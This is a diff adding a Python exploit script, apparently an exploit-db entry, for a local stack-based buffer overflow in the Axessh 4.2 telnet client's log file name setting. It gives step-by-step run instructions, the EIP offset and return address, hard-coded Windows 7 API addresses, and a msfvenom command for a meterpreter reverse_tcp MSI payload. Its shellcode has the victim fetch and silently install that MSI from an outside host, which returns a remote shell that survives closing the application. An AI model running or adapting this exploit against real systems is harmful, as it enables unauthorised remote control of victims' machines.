@@ -1,0 +1,42 @@
+# Title: Axessh 4.2 - 'Log file name'  Local Stack-based Buffer Overflow
+# Date: May 23rd, 2019
+# Author: Uday Mittal (https://github.com/yaksas443/YaksasCSC-Lab/)
+# Vendor Homepage: http://www.labf.com
+# Software Link: http://www.labf.com/download/axessh.exe
+# Version v4.2
+# Tested on: Windows 7 SP1 EN (x86)
+# Reference: https://www.exploit-db.com/exploits/46858
+
+# TO RUN:
+# 0. Setup a multi/handler listener
+# 1. Run python script
+# 2. Copy contents of axssh.txt
+# 3. Open telnet_S.exe
+# 4. Select Details >> Settings >> Logging
+# 5. Select Log all Session Output radio button
+# 6. Paste the contents in Log file name
+# 7. Press "OK"
+# 8. Press "OK"
+
+# EIP offset: 214
+# 0x050e3f04 : push esp # ret  | ascii {PAGE_EXECUTE_READ} [ctl3d32.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v2.31.000 (C:\Windows\system32\ctl3d32.dll)
+
+
+#77da395c - Address of LoadLibraryA() for Windows 7 SPI x86
+#777db16f - Address of system() for Windows 7 SPI x86
+#77da214f - Address of ExitProcess for Windows 7 SPI x86
+
+# Shellcode Reference: https://www.exploit-db.com/shellcodes/46281
+# Payload command command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.163 LPORT=4444 EXITFUNC=seh -f msi > /var/www/html/ms.msi
+# When the payload runs, it floods the system with Command windows and sends back a meterpreter shell. The shell does not die even if the user closes the application.
+
+
+filename = "axssh.txt"
+
+msiScode = "\x31\xc0\x66\xb8\x72\x74\x50\x68\x6d\x73\x76\x63\x54\xbb\x5c\x39\xda\x77\xff\xd3\x89\xc5\x31\xc0\x50\x68\x20\x2f\x71\x6e\x68\x2e\x6d\x73\x69\x68\x33\x2f\x6d\x73\x68\x36\x2e\x31\x36\x68\x38\x2e\x31\x32\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x39\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x89\xe7\x57\xb8\x6f\xb1\x7d\x77\xff\xd0\x31\xc0\x50\xb8\x4f\x21\xda\x77"
+
+evilString = "\x90" * 110 + msiScode + "\x90" * 6 + "\x04\x3f\x0e\x05" + "\x90"*4 + "\x89\xE0\x83\xE8\x7F\x89\xC4\xEB\x81" + "\x90" * 800
+
+file = open(filename,'w')
+file.write(evilString)
+file.close()
